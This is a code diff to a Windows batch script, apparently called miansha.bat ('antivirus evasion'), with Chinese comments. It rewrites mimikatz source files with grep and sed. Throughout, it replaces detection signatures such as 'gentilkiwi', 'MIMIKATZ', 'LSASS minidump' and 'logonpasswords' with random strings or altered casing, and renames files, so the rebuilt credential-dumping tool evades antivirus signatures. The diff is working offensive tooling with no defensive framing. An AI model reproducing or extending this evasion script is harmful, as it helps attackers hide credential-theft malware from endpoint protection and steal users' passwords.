@@ -18,23 +18,23 @@ tools\mv ./mimikatz !_out!
 echo 处理需要重名名文件的
 for %%a in (_m_) do (
     call :RandomStr 10
-    tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%%a" . | tools\xargs tools\sed -b -i "s/%%a/!_out!/g"
+    call :FileRC %%a !_out!
     echo,!_out!
     call :FileRen %%a !_out!
 )
 
 echo 处理不需要重名名文件的
-for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent) do (
+for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent MINIDUMP) do (
     call :RandomStr 10
-    tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%%a" . | tools\xargs tools\sed -b -i "s/%%a/!_out!/g"
+    call :FileRC %%a !_out!
 )
 
 call :RandomStr 10
 tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "LSASS minidump" . | tools\xargs tools\sed -b -i "s/LSASS minidump/!_out!/g"
 
-call :RandomStr 10
-tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "LSA dump" . | tools\xargs tools\sed -b -i "s/LSA dump/!_out!/g"
 
+call :FileRC minidump MiNidump
+call :FileRC logonpasswords logonPasswords
 
 :: =================
 :: 生成随机字符串
@@ -97,4 +97,15 @@ goto:eof
             tools\mv %%i !_var!
         )
     )
+goto:eof
+
+
+:: =================
+:: 文本内容替换
+:: =================
+::
+:FileRC <string> <string>
+    set str_1=%1
+    set str_2=%2
+    tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%str_1%" . | tools\xargs tools\sed -b -i "s/%str_1%/%str_2%/g"
 goto:eof
